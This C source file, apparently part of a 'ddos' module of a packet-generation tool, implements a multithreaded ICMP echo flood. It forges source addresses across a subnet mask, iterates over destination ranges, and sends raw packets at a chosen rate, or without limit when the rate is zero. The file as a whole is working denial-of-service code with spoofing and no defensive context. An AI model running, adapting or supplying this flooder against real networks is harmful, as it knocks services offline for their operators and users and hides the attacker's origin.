#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/subnet_mask.h"
#include "../ddos/icmp_flood.h"

unsigned int icmp_total;
unsigned int icmp_produced;

unsigned int icmp_per_second;
char icmp_dest_ip[16];
char icmp_src_ip[16];

int icmp_src_ip_mask;
int icmp_dest_ip_mask;

char icmp_now_src_ip[16];
char icmp_now_dest_ip[16];

int icmp_dest_port;
int icmp_dest_port_start;
int icmp_now_port = 0;
pthread_mutex_t icmp_mutex = PTHREAD_MUTEX_INITIALIZER;

pthread_cond_t icmp_cond;

struct timespec icmp_time1, icmp_time2;

void icmp_flood_print_usage(int mode) {
	if (mode == 2)
		printf(
				"ICMP flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
}

void* generate_icmp_request2(void *data) {
	//int mask = *((int*) data);
	int sock = make_socket(IPPROTO_ICMP);

	while (1) {

		struct icmp *p;
		char buffer[sizeof(struct icmp)];

		memset(buffer, 0x00, sizeof(struct icmp));

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_now_src_ip));

		//modify icmp_src_ip, increment 1.

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_now_dest_ip));

		p = (struct icmp*) buffer;
		p->icmp_type = ICMP_ECHO;
		p->icmp_code = 0;
		p->icmp_cksum = 0;
		p->icmp_seq = htons(icmp_total);
		p->icmp_id = getpid();
		p->icmp_cksum = in_cksum((u_short*) p, sizeof(struct icmp));

		char *packet = packet_assemble(ipv4_h, p, sizeof(struct icmp));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));

		pthread_mutex_lock(&icmp_mutex);

		generator(icmp_src_ip,
				icmp_dest_ip,
				icmp_src_ip_mask,
				icmp_dest_ip_mask,
				icmp_dest_port_start,
				icmp_dest_port,
				icmp_now_src_ip,
				icmp_now_dest_ip,
							&icmp_now_port);

		//printf("From : %s --> To : %s \n", icmp_now_src_ip, icmp_now_dest_ip);

		//masking_next_ip_addr(icmp_src_ip, icmp_now_src_ip, icmp_src_ip_mask);
		//masking_next_ip_addr(icmp_dest_ip, icmp_now_dest_ip, icmp_dest_ip_mask);

		//0번 예외처리
		/*if (icmp_now_dest_ip[strlen(icmp_now_dest_ip)] == '0'
		 && icmp_now_dest_ip[strlen(icmp_now_dest_ip) - 1] == '.')
		 masking_next_ip_addr(icmp_dest_ip, icmp_now_dest_ip,
		 icmp_dest_ip_mask);
		 */

		//Conditions begin.
		if (icmp_produced >= icmp_per_second) {
			pthread_cond_wait(&icmp_cond, &icmp_mutex);
		}

		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &icmp_time2);
		double icmp_elapsed_time = (icmp_time2.tv_sec - icmp_time1.tv_sec)
				+ ((icmp_time2.tv_nsec - icmp_time1.tv_nsec) / 1000000000.0);

		//If time > 1.0
		if (icmp_elapsed_time >= 1.0) {

			printf("-.\n");
			icmp_produced = 0;

			clock_gettime(CLOCK_MONOTONIC, &icmp_time1);
			pthread_cond_signal(&icmp_cond);
		}

		send_packet(sock, ipv4_h, packet, icmp_now_port);
		free(packet);

		icmp_produced++;
		icmp_total++;
		printf("%d icmp sent\n", icmp_produced);
		pthread_mutex_unlock(&icmp_mutex);
	}
	close(sock);
	return 0;
}

//To unfreeze upper threads.

void* icmp_time_check() {
	while (1) {

		pthread_mutex_lock(&icmp_mutex);

		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &icmp_time2);
		double icmp_elapsed_time = (icmp_time2.tv_sec - icmp_time1.tv_sec)
				+ ((icmp_time2.tv_nsec - icmp_time1.tv_nsec) / 1000000000.0);

		//If time > 1.0
		if (icmp_elapsed_time >= 1.0) {
			printf("-.\n");
			icmp_produced = 0;
			clock_gettime(CLOCK_MONOTONIC, &icmp_time1);
			pthread_cond_signal(&icmp_cond);
		}

		pthread_mutex_unlock(&icmp_mutex);
	}

}

void icmp_flood_run(char *argv[], int mode) {

	int argc = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 2 && argc != 4) {
		icmp_flood_print_usage(mode);
		return;
	}

	/*split_ip_mask_port(argv,
										icmp_src_ip,
										icmp_dest_ip,
										&icmp_src_ip_mask,
										&icmp_dest_ip_mask,
										&icmp_dest_port_start,
										&icmp_dest_port);
*/
	//ip separtion IP/mask -> IP , mask
	get_ip_from_ip_addr(argv[0], icmp_src_ip);
	icmp_src_ip_mask = get_mask_from_ip_addr(argv[0]);
	strcpy(icmp_now_src_ip, icmp_src_ip);

	get_ip_from_ip_addr(argv[1], icmp_dest_ip);
	icmp_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
	strcpy(icmp_now_dest_ip, icmp_dest_ip);

	icmp_produced = 0;

	if (mode == 2) {
		icmp_total = 0;
		icmp_per_second = atoi(argv[3]);

		if (icmp_per_second == 0)
			icmp_per_second = __UINT_MAXIMUM__;

		icmp_dest_port = atoi(argv[2]);
		icmp_dest_port_start = icmp_dest_port;

	}

	int num_threads = 10;

	printf("src>IP : %s\nsrc>mask : %d\n", icmp_src_ip, icmp_src_ip_mask);
	printf("dest>IP : %s\ndest>mask : %d\n", icmp_dest_ip, icmp_dest_ip_mask);

	int *generate_thread_id;
	pthread_t *generate_thread;

	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));

	int i;

	printf("Sending ICMP requests to %s using %d threads\n", icmp_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	//This is where clock starts;

	clock_gettime(CLOCK_MONOTONIC, &icmp_time1);
	for (i = 0; i < num_threads; i++) {

		if (mode == 2)
			pthread_create(&generate_thread[i], NULL, generate_icmp_request2,
					(void*) &generate_thread_id[i]);
	}

	pthread_create(&generate_thread[i], NULL, icmp_time_check, NULL);

	for (i = 0; i < num_threads + 1; i++) {
		void *status;
		printf("called\n");
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}

	printf("ICMP flood Finished\nTotal %d packets sent.\n", icmp_total);

	pthread_mutex_destroy(&icmp_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);

	return;
}

